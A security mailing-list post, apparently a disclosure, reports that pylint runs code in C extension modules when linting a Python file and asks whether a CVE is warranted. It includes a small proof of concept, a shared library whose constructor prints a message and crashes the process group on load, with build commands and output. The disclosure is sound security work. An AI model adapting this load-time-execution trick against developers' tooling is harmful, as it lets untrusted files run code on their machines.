This is, unfortunately, far from reality. Here's a PoC:  $ cat moo.py from _moo import *  $ cat moo.c #include <stdio.h> #include <signal.h> void __attribute__((constructor)) moo() { 	printf("moo!\n"); 	kill(0, SIGSEGV); }  $ gcc -Wall -shared -fPIC moo.c -o _moo.so  $ pylint moo.py No config file found, using default configuration moo! Segmentation fault   My understanding is that upstream Pylint maintainers consider this  behavior intentional[2]. But even then, I think it's a serious  documentation flaw.  Should a CVE ID be assigned to this bug? If yes, it should be a    [0] http://www.pylint.org/ [1] http://docs.pylint.org/faq.html#about-pylint [2]  --  Jakub Wilk  Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.
